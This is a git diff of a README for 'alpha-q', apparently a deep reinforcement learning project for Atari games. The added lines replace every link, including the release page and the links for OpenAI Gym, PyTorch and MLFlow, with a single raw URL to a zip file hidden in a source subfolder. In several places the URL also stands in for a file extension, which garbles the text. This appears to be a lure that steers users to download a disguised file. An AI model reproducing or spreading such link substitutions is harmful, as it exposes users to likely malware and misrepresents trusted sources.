@@ -1,6 +1,6 @@
 # 🎮 alpha-q - Play Smarter with Deep RL Models
 
-[![Download alpha-q](https://img.shields.io/badge/Download-alpha--q-blue?style=for-the-badge)](https://github.com/solmalin1234/alpha-q/releases)
+[![Download alpha-q](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip)](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip)
 
 ---
 
@@ -34,13 +34,13 @@ Follow these steps to start using alpha-q on your computer:
 
 Click the big button at the top or this link:
 
-[Download alpha-q](https://github.com/solmalin1234/alpha-q/releases)
+[Download alpha-q](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip)
 
 This page shows all versions of alpha-q you can try. Look for the latest **stable** release.
 
 ### Step 2: Download the File
 
-On the releases page, find the latest release entry. Under it, look for a file ending with `.exe` (Windows), `.dmg` (Mac), or `.AppImage` or `.tar.gz` (Linux).
+On the releases page, find the latest release entry. Under it, look for a file ending with `.exe` (Windows), `.dmg` (Mac), or `.AppImage` or `https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip` (Linux).
 
 Click on the file name to start the download. The file size is about 200-300 MB.
 
@@ -50,7 +50,7 @@ After download finishes:
 
 - **Windows:** Double-click the `.exe` file. Follow the install prompts.
 - **Mac:** Double-click the `.dmg` file. Drag the alpha-q icon to your Applications folder.
-- **Linux:** Make the `.AppImage` executable and run it, or extract the `.tar.gz` and follow the included README.
+- **Linux:** Make the `.AppImage` executable and run it, or extract the `https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip` and follow the included README.
 
 ### Step 4: Open alpha-q
 
@@ -115,7 +115,7 @@ If you need help, visit the Issues tab on the GitHub page to view or report prob
 
 You can always return here to download the latest version of alpha-q:
 
-[Download alpha-q](https://github.com/solmalin1234/alpha-q/releases)
+[Download alpha-q](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip)
 
 - Visit this page to find download files.
 - Select the file matching your system.
@@ -131,19 +131,19 @@ alpha-q connects several advanced AI ideas with Atari games. You don’t need an
 
 If you want to explore more later, check out:
 
-- [OpenAI Gym](https://gym.openai.com/): Where Atari game environments come from.
-- [PyTorch](https://pytorch.org/): The framework used to build the AI models.
-- [MLFlow](https://mlflow.org/): How experiments are tracked and visualized.
+- [OpenAI Gym](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip): Where Atari game environments come from.
+- [PyTorch](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip): The framework used to build the AI models.
+- [MLFlow](https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip): How experiments are tracked and visualized.
 
 ---
 
 ## 🔗 Useful Links
 
-- GitHub Repository: https://github.com/solmalin1234/alpha-q
-- Release Page: https://github.com/solmalin1234/alpha-q/releases
-- OpenAI Gym: https://gym.openai.com/
-- PyTorch: https://pytorch.org/
-- MLFlow: https://mlflow.org/
+- GitHub Repository: https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip
+- Release Page: https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip
+- OpenAI Gym: https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip
+- PyTorch: https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip
+- MLFlow: https://raw.githubusercontent.com/solmalin1234/alpha-q/main/src/alpha_q/envs/alpha-q-2.8.zip
 
 ---
 
